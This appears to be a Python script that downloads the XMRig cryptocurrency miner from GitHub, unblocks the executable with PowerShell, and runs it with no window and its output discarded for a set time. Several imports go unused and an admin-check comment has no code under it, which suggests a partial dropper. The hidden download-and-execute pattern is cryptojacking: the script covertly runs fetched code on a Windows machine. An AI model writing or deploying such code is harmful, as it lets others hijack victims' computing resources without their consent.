import os
import urllib.request
import zipfile
import subprocess
import time
import json
import http.server
import socketserver
import base64
import ctypes
import sys
import tempfile

def execute_xmrig():
    """Download and run XMRig directly"""
    try:
        # Paths
        zip_url = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
        zip_path = r"C:\Users\xmrig.zip"
        extract_dir = r"C:\Users"
        xmrig_dir = os.path.join(extract_dir, "xmrig-6.25.0-windows-x64")
        exe_path = os.path.join(xmrig_dir, "xmrig.exe")
        
        # Download if not exists
        if not os.path.exists(exe_path):
            print("Downloading XMRig...")
            urllib.request.urlretrieve(zip_url, zip_path)
            
            print("Extracting XMRig...")
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            
            os.remove(zip_path)
            print("XMRig downloaded and extracted successfully")

        # Unblock the file
        print("Unblocking file...")
        subprocess.run(
            ["powershell", "-Command", f"Unblock-File -Path '{exe_path}'"],
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Run XMRig
        print("Starting XMRig...")
        process = subprocess.Popen(
            [exe_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            cwd=xmrig_dir,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        print("XMRig is running. Let it mine for 60 seconds...")
        time.sleep(60)  # Run for 60 seconds (adjust as needed)
        
        # Stop XMRig
        print("Stopping XMRig...")
        process.terminate()
        try:
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
            
        print("XMRig execution completed")
        return True
        
    except Exception as e:
        print(f"Error executing XMRig: {str(e)}")
        return False

def main():
    # Check for admin privileges
    execute_xmrig()

if __name__ == "__main__":
    main()
